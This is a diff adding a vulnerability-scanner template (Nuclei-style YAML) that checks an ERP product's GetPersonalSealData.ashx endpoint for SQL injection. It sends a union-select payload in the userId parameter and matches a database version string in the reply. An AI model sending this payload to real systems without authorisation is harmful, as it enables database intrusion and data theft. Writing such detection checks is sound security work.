@@ -1,0 +1,30 @@
+id: 5pm66YKm5Zu96ZmF-ERP-sql
+info:
+  name: "5pm66YKm5Zu96ZmF ERP GetPersonalSealData.ashx SQL注入漏洞"
+  author: Unknown
+  severity: high
+  description: "5pm66YKm5Zu96ZmF ERP系统中存在QL注入漏洞，攻击者可通过构造恶意SQL语句执行未经授权的数据库操作\n  该缺陷允许远程攻击者绕过输入验证机制，实现数据泄露、数据篡改或权限提升等安全风险\n  漏洞影响范围覆盖所有未修复版本，建议立即部署官方安全补丁"
+  tags: 5pm66YKm5Zu96ZmF ERP
+
+http:
+- raw:
+  - |
+    GET /SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20@@version-- HTTP/1.1
+    Host: {{Hostname}}
+
+
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '"SealData":"Microsoft'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
